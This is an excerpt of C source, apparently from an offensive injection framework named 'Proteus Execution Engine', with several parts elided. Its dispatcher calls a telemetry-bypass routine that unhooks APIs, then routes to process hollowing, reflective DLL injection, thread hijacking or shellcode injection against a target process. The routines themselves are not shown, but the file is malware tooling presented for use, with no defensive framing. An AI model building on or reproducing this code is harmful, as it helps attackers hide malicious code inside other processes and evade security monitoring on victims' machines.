/* ============================================================================
 * Proteus- Execution Engine -- inject.c
 * Injection dispatcher + ABI version.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include "../include/jockey_abi.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned int jockey_abi_version(void) {
    return JOCKEY_ABI_VERSION;
}
...
int inject_process(InjectionConfig* config) {
    ...
    if (config->targetPid == 0U && (!config->targetImage || !config->targetImage[0])) {
        LOG_ERROR("inject_process: no target PID or image");
        return JOCKEY_ERR_INVALID_PARAM;
    }
    ...
    if (config->unhookApi) {
        ...
        if (bypass_telemetry() != JOCKEY_ERR_OK) {
            LOG_WARN("telemetry bypass failed; continuing");
        }
    }
    ...
    switch (config->method) {
        case INJECT_METHOD_PROCESS_HOLLOWING: return perform_process_hollowing(config);
        case INJECT_METHOD_REFLECTIVE_DLL:    return perform_reflective_injection(config);
        case INJECT_METHOD_THREAD_HIJACKING:  return perform_thread_hijacking(config);
        case INJECT_METHOD_SHELLCODE:         return perform_shellcode_injection(config);
        default: return JOCKEY_ERR_INVALID_PARAM;
    }
}
